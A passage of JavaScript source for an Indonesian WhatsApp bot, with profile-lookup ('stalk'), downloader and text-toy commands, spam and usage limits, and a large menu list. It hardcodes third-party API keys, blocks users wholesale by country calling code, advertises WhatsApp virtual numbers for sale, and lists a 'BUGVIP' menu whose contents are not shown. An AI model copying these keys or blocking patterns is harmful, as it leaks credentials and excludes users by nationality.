            url_nya: "",
          },
        };
        fs.writeFileSync(
          PathAuto + sender.split("@")[0] + ".json",
          JSON.stringify(path_objec_auto, null, 2)
        );
        reply(
          "*Silahkan kirim Url/Link YouTube*\n\nContoh: https://youtu.be/watyplEMt90"
        );
      } else {
        reply("Url YouTube nya mana kak?");
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_pathauto = JSON.parse(
          fs.readFileSync(PathAuto + sender.split("@")[0] + ".json")
        );
        if (data_pathauto.session === "ytmp3") {
          if (chats.length === 0) return;
          data_pathauto.data.url_nya = chats;
          var ytmp3 = await fetchJson(
            `https://saipulanuar.ga/api/download/ytmp3?url=${data_pathauto.data.url_nya}&apikey=jPHjZpQF`
          );
          var xx = ytmp3.result;
          if (ytmp3.status == 500)
            return reply(
              "*Link yg kamu berikan tidak valid*\n*Silahkan kirim url yg valid&benar*"
            );
          data_pathauto.session = "input_urlytmp3";
          fs.writeFileSync(
            PathAuto + sender.split("@")[0] + ".json",
            JSON.stringify(data_pathauto, null, 3)
          );
          reply(`*YTMP3 DOWNLOAD*

*title:* ${xx.title}
*channel:* ${xx.channel}
*published:* ${xx.published}
*views:* ${xx.views}
*type:* audio/mp3

_Sedang mengirim audio..._`);
          conn.sendMessage(
            sender,
            {
              audio: { url: xx.url },
              mimetype: "audio/mpeg",
              fileName: `${xx.title}.mp3`,
            },
            { quoted: msg }
          );
          if (isGroup)
            return conn.sendMessage(
              from,
              { text: "Audio sudah dikirim lewat chat pribadi bot." },
              { quoted: msg }
            );
          fs.unlinkSync(PathAuto + sender.split("@")[0] + ".json");
        }
      }
    } else if (command === "stalknpm") {
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var path_objec_auto = {
          ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
          session: "stalknpm",
          data: {
            id_nya: "",
          },
        };
        fs.writeFileSync(
          PathAuto + sender.split("@")[0] + ".json",
          JSON.stringify(path_objec_auto, null, 2)
        );
        reply("*Silahkan kirim Username Npm*\n*Contoh:* hikki-me");
      } else {
        reply("Username npmnya mana kak?");
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_pathauto = JSON.parse(
          fs.readFileSync(PathAuto + sender.split("@")[0] + ".json")
        );
        if (data_pathauto.session === "stalknpm") {
          data_pathauto.data.id_nya = chats;

          var x = await fetchJson(
            `https://api.popcat.xyz/npm?q=${data_pathauto.data.id_nya}`
          );
          if (x.error)
            return reply(
              "Username tidak ditemukan\nSilahkan kirim username Npm yg benar."
            );
          data_pathauto.session = "use_npmstalk";
          fs.writeFileSync(
            PathAuto + sender.split("@")[0] + ".json",
            JSON.stringify(data_pathauto, null, 3)
          );
          var npm_text = `*NPM STALKER*
name : ${x.name}
version : ${x.version}
description : ${x.description}
author : ${x.author}
author_email : ${x.author_email}
last_published : ${x.last_published}
maintainers : ${x.maintainers}
repository : ${x.repository}

keywords : ${x.keywords}`;
          reply(npm_text);
          fs.unlinkSync(PathAuto + sender.split("@")[0] + ".json");
        }
      }
    } else if (command === "stalkgithub") {
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var path_objec_auto = {
          ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
          session: "stalkgithub",
          data: {
            id_nya: "",
          },
        };
        fs.writeFileSync(
          PathAuto + sender.split("@")[0] + ".json",
          JSON.stringify(path_objec_auto, null, 2)
        );
        reply("*Silahkan kirim Username Github*");
      } else {
        reply("username nya mana kak?");
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_pathauto = JSON.parse(
          fs.readFileSync(PathAuto + sender.split("@")[0] + ".json")
        );
        if (data_pathauto.session === "stalkgithub") {
          data_pathauto.data.id_nya = chats;

          var git = await fetchJson(
            `https://api.github.com/users/${data_pathauto.data.id_nya}`
          );
          data_pathauto.session = "input_username_github";
          fs.writeFileSync(
            PathAuto + sender.split("@")[0] + ".json",
            JSON.stringify(data_pathauto, null, 3)
          );
          let textGitthub = `*STALK-GITHUB*
id : ${git.id}
login : ${git.login}
html_url : ${git.html_url}
type : ${git.type}
name : ${git.name}
location : ${git.location}
bio : ${git.bio}
public_repos : ${git.public_repos}
followers : ${git.followers}
following : ${git.following}
created : ${git.created_at}
updated : ${git.updated_at}`;
          reply(textGitthub);
          fs.unlinkSync(PathAuto + sender.split("@")[0] + ".json");
        }
      }
    } else if (command === "besarkecil") {
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var path_objec_auto = {
          ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
          session: "besar_kecilnya",
          data: {
            text_nya: "",
          },
        };
        fs.writeFileSync(
          PathAuto + sender.split("@")[0] + ".json",
          JSON.stringify(path_objec_auto, null, 2)
        );
        reply(
          "*Silahkan tulis text yg ingin dijadiin besar dan kecil.*\n\n*Contoh:* hallo bro"
        );
      } else {
        reply("nomor nya mana kak?");
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_pathauto = JSON.parse(
          fs.readFileSync(PathAuto + sender.split("@")[0] + ".json")
        );
        if (data_pathauto.session === "besar_kecilnya") {
          data_pathauto.data.text_nya = chats;
          data_pathauto.session = "text_nya_cuy";
          var xx_besar = await fetchJson(
            `https://api.nataganz.com/api/random/besarkecil?text=${data_pathauto.data.text_nya}&apikey=Pasha`
          );
          fs.writeFileSync(
            PathAuto + sender.split("@")[0] + ".json",
            JSON.stringify(data_pathauto, null, 3)
          );
          reply(`*BESAR KECIL*
*Text:* ${data_pathauto.data.text_nya}
*Hasil:* ${xx_besar.result.list}`);
          fs.unlinkSync(PathAuto + sender.split("@")[0] + ".json");
        }
      }
    } else if (command === "bilangangka") {
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var path_objec_auto = {
          ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
          session: "bilang_angkanya",
          data: {
            text_nya: "",
          },
        };
        fs.writeFileSync(
          PathAuto + sender.split("@")[0] + ".json",
          JSON.stringify(path_objec_auto, null, 2)
        );
        reply("*Silahkan tulis number yg ingin dibilang.*\n\n*Contoh:* 1234");
      } else {
        reply("nomor nya mana kak?");
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_pathauto = JSON.parse(
          fs.readFileSync(PathAuto + sender.split("@")[0] + ".json")
        );
        if (data_pathauto.session === "bilang_angkanya") {
          if (chats.length === 0) return;
          if (isNaN(chats)) return reply("Hanya angka!");
          data_pathauto.data.text_nya = Number(chats);
          data_pathauto.session = "text_nya_cuy";
          var xx_bilang = await fetchJson(
            `https://api.nataganz.com/api/random/bilangangka?text=${data_pathauto.data.text_nya}&apikey=Pasha`
          );
          fs.writeFileSync(
            PathAuto + sender.split("@")[0] + ".json",
            JSON.stringify(data_pathauto, null, 3)
          );
          reply(`*BILANG ANGKA*
*Nomor:* ${data_pathauto.data.text_nya}
*Hasil:* ${xx_bilang.result.list}`);
          fs.unlinkSync(PathAuto + sender.split("@")[0] + ".json");
        }
      }
    } else if (command === "balikangka") {
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var path_objec_auto = {
          ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
          session: "balik_angkanya",
          data: {
            text_nya: "",
          },
        };
        fs.writeFileSync(
          PathAuto + sender.split("@")[0] + ".json",
          JSON.stringify(path_objec_auto, null, 2)
        );
        reply("*Silahkan tulis number yg ingin dibalik.*\n\n*Contoh:* 1234");
      } else {
        reply("nomor nya mana kak?");
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_pathauto = JSON.parse(
          fs.readFileSync(PathAuto + sender.split("@")[0] + ".json")
        );
        if (data_pathauto.session === "balik_angkanya") {
          if (chats.length === 0) return;
          if (isNaN(chats)) return reply("Hanya angka!");
          data_pathauto.data.text_nya = Number(chats);
          data_pathauto.session = "text_nya_cuy";
          var xx_angka = await fetchJson(
            `https://api.nataganz.com/api/random/balikangka?text=${data_pathauto.data.text_nya}&apikey=Pasha`
          );
          fs.writeFileSync(
            PathAuto + sender.split("@")[0] + ".json",
            JSON.stringify(data_pathauto, null, 3)
          );
          reply(`*BALIK ANGKA*
*Nomor Asli:* ${data_pathauto.data.text_nya}
*Nomor Hasil:* ${xx_angka.result.list}`);
          fs.unlinkSync(PathAuto + sender.split("@")[0] + ".json");
        }
      }
    } else if (command === "balikhuruf") {
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var path_objec_auto = {
          ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
          session: "balik_hurufnya",
          data: {
            text_nya: "",
          },
        };
        fs.writeFileSync(
          PathAuto + sender.split("@")[0] + ".json",
          JSON.stringify(path_objec_auto, null, 2)
        );
        reply("*Silahkan tulis text yg ingin dibalik.*\n\n*Contoh:* Ngetes");
      } else {
        reply("text nya mana kak?");
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_pathauto = JSON.parse(
          fs.readFileSync(PathAuto + sender.split("@")[0] + ".json")
        );
        if (data_pathauto.session === "balik_hurufnya") {
          data_pathauto.data.text_nya = chats;
          data_pathauto.session = "text_nya_cuy";
          var xx_huruf = await fetchJson(
            `https://api.nataganz.com/api/random/balikhuruf?text=${data_pathauto.data.text_nya}&apikey=Pasha`
          );
          fs.writeFileSync(
            PathAuto + sender.split("@")[0] + ".json",
            JSON.stringify(data_pathauto, null, 3)
          );
          reply(`*BALIK HURUF*
*Text Asli:* ${data_pathauto.data.text_nya}
*Text Hasil:* ${xx_huruf.result.list}`);
          fs.unlinkSync(PathAuto + sender.split("@")[0] + ".json");
        }
      }
    } else if (command === "stalkff") {
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var path_objec_auto = {
          ID: require("crypto").randomBytes(5).toString("hex").toUpperCase(),
          session: "stalkff",
          data: {
            id_nya: "",
          },
        };
        fs.writeFileSync(
          PathAuto + sender.split("@")[0] + ".json",
          JSON.stringify(path_objec_auto, null, 2)
        );
        reply("*Silahkan kirim ID free fire kamu*");
      } else {
        reply("id ff nya mana kak?");
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_pathauto = JSON.parse(
          fs.readFileSync(PathAuto + sender.split("@")[0] + ".json")
        );
        if (data_pathauto.session === "stalkff") {
          if (chats.length === 0) return;
          if (isNaN(chats)) return reply("Hanya angka!");
          data_pathauto.data.id_nya = Number(chats);
          let stalk_freefire = await stalkff(data_pathauto.data.id_nya);
          if (stalk_freefire.status == 404)
            return reply(
              "*Error ID tidak ditemukan*\n*Silahkan kirim ID yg valid*"
            );
          data_pathauto.session = "input_id_ff";
          fs.writeFileSync(
            PathAuto + sender.split("@")[0] + ".json",
            JSON.stringify(data_pathauto, null, 3)
          );
          reply(`*STALKER FF*
*ID:* ${data_pathauto.data.id_nya}
*Username:* ${stalk_freefire.nickname}`);
          fs.unlinkSync(PathAuto + sender.split("@")[0] + ".json");
        }
      }
    } else if (command === "tahta_maker") {
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var path_objec_auto = {
          session: "tahta",
          data: {
            nulis_nya: "",
          },
        };
        fs.writeFileSync(
          PathAuto + sender.split("@")[0] + ".json",
          JSON.stringify(path_objec_auto, null, 2)
        );
        reply("*Silahkan kirim nama yang mau ditulis.*");
      } else {
        reply("Namanya apa?");
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_pathauto = JSON.parse(
          fs.readFileSync(PathAuto + sender.split("@")[0] + ".json")
        );
        if (data_pathauto.session === "tahta") {
          data_pathauto.data.nulis_nya = chats;

          data_pathauto.session = "tahta_yexftt";
          fs.writeFileSync(
            PathAuto + sender.split("@")[0] + ".json",
            JSON.stringify(data_pathauto, null, 3)
          );
          reply("Wait sedang menulis..");
          var tah = `https://leyscoders-api.herokuapp.com/api/harta-tahta?text=${data_pathauto.data.nulis_nya}&apikey=IkyOgiwara`;
          conn.sendMessage(
            from,
            { image: { url: tah }, caption: "Done!" },
            { quoted: msg }
          );
          fs.unlinkSync(PathAuto + sender.split("@")[0] + ".json");
        }
      }
    } else if (command === "sadcat") {
      if (!fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
        var path_objec_auto = {
          session: "sadcat",
          data: {
            nulis_nya: "",
          },
        };
        fs.writeFileSync(
          PathAuto + sender.split("@")[0] + ".json",
          JSON.stringify(path_objec_auto, null, 2)
        );
        reply("*Silahkan kirim text yang mau ditulis.*");
      } else {
        reply("Text yg mau jadiin sadcat mana??");
      }
    }

    if (fs.existsSync(PathAuto + sender.split("@")[0] + ".json")) {
      if (!chats.startsWith(prefix) && !msg.key.fromMe) {
        let data_pathauto = JSON.parse(
          fs.readFileSync(PathAuto + sender.split("@")[0] + ".json")
        );
        if (data_pathauto.session === "sadcat") {
          data_pathauto.data.nulis_nya = chats;
          data_pathauto.session = "masukan_texcatt";
          fs.writeFileSync(
            PathAuto + sender.split("@")[0] + ".json",
            JSON.stringify(data_pathauto, null, 3)
          );
          reply("Wait sedang bikin makernya..");
          var nul = `https://api.popcat.xyz/sadcat?text=${data_pathauto.data.nulis_nya}`;
          conn.sendMessage(
            from,
            { image: { url: nul }, caption: "Done!" },
            { quoted: msg }
          );
          fs.unlinkSync(PathAuto + sender.split("@")[0] + ".json");
        }
      }
    }

    msgFilter.ResetSpam(orang_spam);

    const spampm = () => {
      console.log(
        color("~>[SPAM]", "red"),
        color(
          moment(msg.messageTimestamp * 1000).format("DD/MM/YY HH:mm:ss"),
          "yellow"
        ),
        color(`${command} [${args.length}]`),
        "from",
        color(pushname)
      );
      msgFilter.addSpam(sender, orang_spam);
      reply(
        "Kamu terdeteksi spam bot tanpa jeda, lakukan perintah setelah 5 detik"
      );
    };

    const spamgr = () => {
      console.log(
        color("~>[SPAM]", "red"),
        color(
          moment(msg.messageTimestamp * 1000).format("DD/MM/YY HH:mm:ss"),
          "yellow"
        ),
        color(`${command} [${args.length}]`),
        "from",
        color(pushname),
        "in",
        color(groupName)
      );
      msgFilter.addSpam(sender, orang_spam);
      reply(
        "Kamu terdeteksi spam bot tanpa jeda, lakukan perintah setelah 5 detik"
      );
    };

    if (isCmd && msgFilter.isFiltered(sender) && !isGroup) return spampm();
    if (isCmd && msgFilter.isFiltered(sender) && isGroup) return spamgr();
    if (isCmd && args.length < 1 && !isOwner) msgFilter.addFilter(sender);

    if (sender.startsWith("212")) {
      return conn.updateBlockStatus(sender, "block");
    }
    if (sender.startsWith("91")) {
      return conn.updateBlockStatus(sender, "block");
    }
    if (sender.startsWith("92")) {
      return conn.updateBlockStatus(sender, "block");
    }
    if (sender.startsWith("90")) {
      return conn.updateBlockStatus(sender, "block");
    }
    if (sender.startsWith("54")) {
      return conn.updateBlockStatus(sender, "block");
    }
    if (sender.startsWith("55")) {
      return conn.updateBlockStatus(sender, "block");
    }
    if (sender.startsWith("40")) {
      return conn.updateBlockStatus(sender, "block");
    }
    if (sender.startsWith("94")) {
      return conn.updateBlockStatus(sender, "block");
    }
    if (sender.startsWith("60")) {
      return conn.updateBlockStatus(sender, "block");
    }

    if (isGroup && isCmd && !fromMe) {
      console.log(
        colors.green.bold("[Group]") +
          " " +
          colors.brightCyan(time) +
          " " +
          colors.black.bgYellow(command) +
          " " +
          colors.green("from") +
          " " +
          colors.blue(groupName)
      );
    }

    // Reset Limit
    let cron = require("node-cron");
    cron.schedule(
      "00 12 * * *",
      () => {
        let user = Object.keys(db_user);
        for (let jid of user) db_user[jid].limit = 20;
        fs.writeFileSync("./database/pengguna.json", JSON.stringify(db_user));
        console.log("Reseted Limit");
      },
      {
        scheduled: true,
        timezone: "Asia/Jakarta",
      }
    );

    const confirmlimit = (sender, amount) => {
      if (isPremium) {
        return false;
      }
      let position = false;
      Object.keys(db_user).forEach((i) => {
        if (db_user[i].id == sender) {
          position = i;
        }
      });
      if (position !== false) {
        db_user[position].limit -= amount;
        fs.writeFileSync("./database/pengguna.json", JSON.stringify(db_user));
      }
    };

    const checklimitUser = (sender) => {
      let position = false;
      Object.keys(db_user).forEach((i) => {
        if (db_user[i].id === sender) {
          position = i;
        }
      });
      if (position !== false) {
        return db_user[position].limit;
      }
    };

    if (!isGroup && isCmd && !fromMe) {
      console.log(
        colors.green.bold("[Private]") +
          " " +
          colors.brightCyan(time) +
          " " +
          colors.black.bgYellow(command) +
          " " +
          colors.green("from") +
          " " +
          colors.blue(pushname)
      );
    }

    const seactions = [
      {
        title: `𝐒𝐈𝐋𝐀𝐇𝐊𝐀𝐍 𝐏𝐈𝐋𝐈𝐇 𝐃𝐈 𝐁𝐀𝐖𝐀𝐇`,
        rows: [
          {
            title: `👌 ALL MENU`,
            rowId: `${prefix}allmenu`,
            description: `Menampilkan daftar all menu`,
          },
          {
            title: `📼 OWNER MENU`,
            rowId: `${prefix}ownermenu`,
            description: `Menampilkan daftar menu owner`,
          },
          {
            title: `🤖 CHATGPT`,
            rowId: `${prefix}openai`,
            description: `Menampilkan Menu ChatGPT OpenAI`,
          },
          {
            title: `🎶 DOWNLOAD MENU`,
            rowId: `${prefix}downloadermenu`,
            description: "Menampilkan daftar  download menu",
          },
          {
            title: `📼 GROUP MENU`,
            rowId: `${prefix}groupmenu`,
            description: `Menampilkan daftar menu groupmenu`,
          },
          {
            title: `🙌 CONVERTER MENU`,
            rowId: `${prefix}convertmenu`,
            description: `Menampilkan daftar converter menu`,
          },
          {
            title: `😁 MAIN MENU`,
            rowId: `${prefix}mainmenu`,
            description: `Menampilkan daftar main menu`,
          },
          {
            title: `😉 USER MENU`,
            rowId: `${prefix}usermenu`,
            description: `Menampilkan daftar user menu`,
          },
          {
            title: `🈳 STORE MENU`,
            rowId: `${prefix}storemenu`,
            description: `Menampilkan daftar store menu`,
          },
          {
            title: `🐔 AUTODECT MENU`,
            rowId: `${prefix}autodectmenu`,
            description: `Menampilkan daftar autodect menu`,
          },
          {
            title: `🛺 BUGVIP MENU`,
            rowId: `${prefix}bugvipmenu`,
            description: `Menampilkan daftar bugvip menu`,
          },
          {
            title: `⚙️ TOOLS MENU`,
            rowId: `${prefix}toolsmenu`,
            description: `Menampilkan daftar tollsmenu menu`,
          },
          {
            title: `✨ RANDOMCEK MENU`,
            rowId: `${prefix}randomcekmenu`,
            description: `Menampilkan daftar randomcek menu`,
          },
          {
            title: `🪢 SERTIFIKAT MENU`,
            rowId: `${prefix}sertifikatmenu`,
            description: `Menampilkan daftar sertifikat menu`,
          },
          {
            title: `🧢 LOGOMAKER MENU`,
            rowId: `${prefix}logomakermenu`,
            description: `Menampilkan daftar logomaker menu`,
          },
          {
            title: `🏃 ANONYMOUS MENU`,
            rowId: `${prefix}anonymousemenu`,
            description: `Menampilkan daftar anonymousemenu menu`,
          },
          {
            title: `🏪 SOSMEDSHOP MENU`,
            rowId: `${prefix}sosmedshopmenu`,
            description: `Menampilkan daftar sosmedshop menu`,
          },
          {
            title: `🎙️ VOKAL MENU`,
            rowId: `${prefix}vokalmenu`,
            description: `Menampilkan daftar vokalmenu menu`,
          },
          {
            title: `🥵 RANDOM MENU`,
            rowId: `${prefix}randommenu`,
            description: `Menampilkan daftar random menu`,
          },
          {
            title: `🥞 PRIMBON MENU`,
            rowId: `${prefix}primbonmenu`,
            description: `Menampilkan daftar primbon menu`,
          },
          {
            title: `😒 ASUPAN MENU`,
            rowId: `${prefix}asupangachamenu`,
            description: `Menampilkan daftar asupan menu`,
          },
          {
            title: `🔉 AUDIO CHANGER MENU`,
            rowId: `${prefix}audiochangermenu`,
            description: `Menampilkan daftar audio changer menu`,
          },
          {
            title: `ℹ️ INFORMATION MENU`,
            rowId: `${prefix}informationmenu`,
            description: `Menampilkan daftar information menu`,
          },
          {
            title: `⛳ RANDOM STICKER MENU`,
            rowId: `${prefix}randomstickermenu`,
            description: `Menampilkan daftar randomsticker menu`,
          },
          {
            title: `🥃 AUDIO MENU`,
            rowId: `${prefix}audiomenu`,
            description: `Menampilkan daftar audio menu`,
          },
          {
            title: `🐻‍❄️ FUN MENU`,
            rowId: `${prefix}funmenu`,
            description: `Menampilkan daftar fun menu`,
          },
          {
            title: `😎 WALLPAPER MENU`,
            rowId: `${prefix}wallpapermenu`,
            description: `Menampilkan daftar walpaper menu`,
          },
          {
            title: `🥞 ANIME MENU`,
            rowId: `${prefix}animemenu`,
            description: `Menampilkan daftar anime menu`,
          },
          {
            title: `📚 CERPEN MENU`,
            rowId: `${prefix}cerpen`,
            description: `Menampilkan daftar cerpen menu`,
          },
          {
            title: `🔞 NSFW MENU`,
            rowId: `${prefix}nsfwmenu`,
            description: `Menampilkan daftar nsfw menu`,
          },
          {
            title: `➿ SOUND MENU`,
            rowId: `${prefix}soundmenu`,
            description: `Menampilkan daftar sound menu`,
          },
          {
            title: `🗨️ TEXT PRO MENU`,
            rowId: `${prefix}textpromenu`,
            description: `Menampilkan daftar text pro menu`,
          },
          {
            title: `📷 EPHOTO MENU`,
            rowId: `${prefix}ephotomenu`,
            description: `Menampilkan daftar ephoto menu`,
          },
          {
            title: `🙅‍♂️ RANDOM IMAGE MENU`,
            rowId: `${prefix}randomimagemenu`,
            description: `Menampilkan daftar random image menu`,
          },
        ],
      },
    ];

    const listMenuMessage = {
      text: `Hai @${
        sender.split("@")[0]
      } Pencet Button List Menunya Nya Di Bawah Ya`,
      buttonText: "🪀 MENU 🪀",
      sections: seactions,
      listType: 1,
    };

    const dftr_menu = [
      {
        buttonId: `${prefix}verify`,
        buttonText: { displayText: "DAFTAR" },
        type: 1,
      },
    ];

    const buta_menu = {
      text: mess.OnlyUser,
      footer: botName,
      buttons: dftr_menu,
      mentions: [sender],
      headerType: 1,
    };

    const limitabis = `*[LIMIT KAMU HABIS]*\nBeli limit di ${prefix}owner atau beli premium untuk mendapatkan unlimited limit, atau bisa menunggu direset kembali pada jam 00:00`;

    switch (command) {
      case "verify":
        {
          if (cekUser("id", sender) !== null)
            return reply("Kamu sudah terdaftar !!");
          var res_us = `${makeid(10)}`;
          var user_name = `#GR${makeid(5)}`;
          let limit = 20;
          let object_user = {
            id: sender,
            name: user_name,
            seri: res_us,
            limit: limit,
            premium: false,
          };
          db_user.push(object_user);
          fs.writeFileSync(
            "./database/pengguna.json",
            JSON.stringify(db_user, 2, null)
          );
          mentions(`𝖬𝖾𝗆𝗎𝖺𝗍 𝖴𝗌𝖾𝗋 @${sender.split("@")[0]}`, [sender]);
          await sleep(1500);
          var verify_teks = `───「 𝗧𝗘𝗥𝗩𝗘𝗥𝗜𝗙𝗜𝗞𝗔𝗦𝗜 」────

○ ID : @${sender.split("@")[0]}
○ Name : ${user_name}
○ Seri : ${res_us}
○ Limit : ${limit}

silahkan ketik #rules
untuk membaca rules bot
`;
          var buttonMessage = {
            text: verify_teks,
            footer: "Klik button untuk melihat menu",
            mentions: [sender],
            buttons: [
              {
                buttonId: "#menu",
                buttonText: { displayText: "️⋮☰ 𝗠𝗘𝗡𝗨" },
                type: 1,
              },
            ],
            headerType: 1,
          };
          conn.sendMessage(from, buttonMessage, { quoted: msg });
        }
        break;
      case "iklan":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          var strip = "```";
          var menu_list = `
_Utamakan chat to the point_ 🚀

*_Admin hanya melayani chat_*
*_Seputar Abot & transaksi_*

${strip}Telpon/Spam blokir 🚫${strip}

_Admin : 0812-6915-328_

*SCRIPT BOT 🛒*
_Rp50.000 - ( Topup & Fitur 300+ )_
_Rp100.000 - ( Topup & Fitur 600+ )_

*_Ready Nokos Whatsapp +1_*
*_Harga Murah? Chat Admin_*
*_Open Stok Terbatas⚠️_*

*_VIA : DANA/OVO/QRIS_*

*Minta SV? Sebut Nama 🙏*
*No Admin Reall Hanya*
*Di Atas, Selain Itu Clone*‼️
`;
          reply(menu_list);
        }
        break;
      case "menu":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          const more = String.fromCharCode(8206);
          const readmore = more.repeat(4001);
          var no = 1;
          var ad = 1;
          let namenya = `${cekUser("name", sender)}`;
          let premnya = `${cekUser("premium", sender) ? "Aktif" : "Tidak"}`;
          let limitnya = `${
            isPremium ? "UNLIMITED" : `${checklimitUser(sender)}`
          }`;
          let usernya = `${("id", db_user).length}`;
          let romnya = `${db_menfes.length}`;
          const gurbot = "6283834558105@s.whatsapp.net";
          const mark_slebew = "628126915328@s.whatsapp.net";
          var footer_nya = `𝑷𝒐𝒘𝒆𝒓𝒆𝒅 𝑩𝒚 @${mark_slebew.split("@")[0]}`;
          var menu_nya = `${listmenu(
            sender,
            namenya,
            premnya,
            limitnya,
            usernya,
            romnya,
            tanggal,
            jam,
            no
          )}`;
          let btn_menu = [
            {
              buttonId: `${prefix}groupbot`,
              buttonText: { displayText: "⋮☰ GROUP" },
              type: 1,
            },
            {
              buttonId: `${prefix}cmd`,
              buttonText: { displayText: "⋮☰ MENU" },
              type: 1,
            },
            {
              buttonId: `${prefix}rules`,
              buttonText: { displayText: "⋮☰ RULES" },
              type: 1,
            },
          ];
          var but_menu = {
            text: menu_nya,
            footer: footer_nya,
            buttons: btn_menu,
            mentions: [sender, mark_slebew],
            headerType: 1,
          };
          conn.sendMessage(from, but_menu, { quoted: msg });
        }
        break;

      case "cmd":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          conn.sendMessage(from, listMenuMessage);
        }
        break;

      case "allmenu":
      case "menuall":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(allmenu(prefix, ad));
        }
        break;

      case "mainemnu":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(mainmenu(prefix, ad));
        }
        break;

      case "usermenu":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(usermenu(prefix, ad));
        }
        break;

      case "ownermenu":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(ownermenu(prefix, ad));
        }
        break;

      case "storemenu":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(storemenu(prefix, ad));
        }
        break;

      case "groupmenu":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(groupmenu(prefix, ad));
        }
        break;

      case "autodectmenu":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(autodectmenu(prefix, ad));
        }
        break;

      case "downloadermenu":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(downloadermenu(prefix, ad));
        }
        break;

      case "bugvipmenu":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(bugvipmenu(prefix, ad));
        }
        break;

      case "convertmenu":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(convertmenu(prefix, ad));
        }
        break;

      case "toolsmenu":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(toolsmenu(prefix, ad));
        }
        break;

      case "randomcekmenu":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(randomcekmenu(prefix, ad));
        }
        break;

      case "sertifikatmenu":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(sertifikatmenu(prefix, ad));
        }
        break;

      case "logomakermenu":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(logomakermenu(prefix, ad));
        }
        break;

      case "anonymousemenu":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(anonymousemenu(prefix, ad));
        }
        break;

      case "sosmedshopmenu":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(sosmedshopmenu(prefix, ad));
        }
        break;

      case "vokalmenu":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(vokalmenu(prefix, ad));
        }
        break;

      case "randommenu":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(randomenu(prefix, ad));
        }
        break;

      case "primbonmenu":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(primbonmenu(prefix, ad));
        }
        break;

      case "asupangachamenu":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(asupangachamenu(prefix, ad));
        }
        break;

      case "audiochangermenu":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(audiochangermenu(prefix, ad));
        }
        break;

      case "informationmenu":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(informationmenu(prefix, ad));
        }
        break;

      case "randomstickermenu":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(randomstickermenu(prefix, ad));
        }
        break;

      case "audiomenu":
        {
          if (cekUser("id", sender) == null)
            return conn.sendMessage(from, buta_menu);
          reply(audiomenu(prefix, ad));
        }
        break;

      case "funmenu":
        {
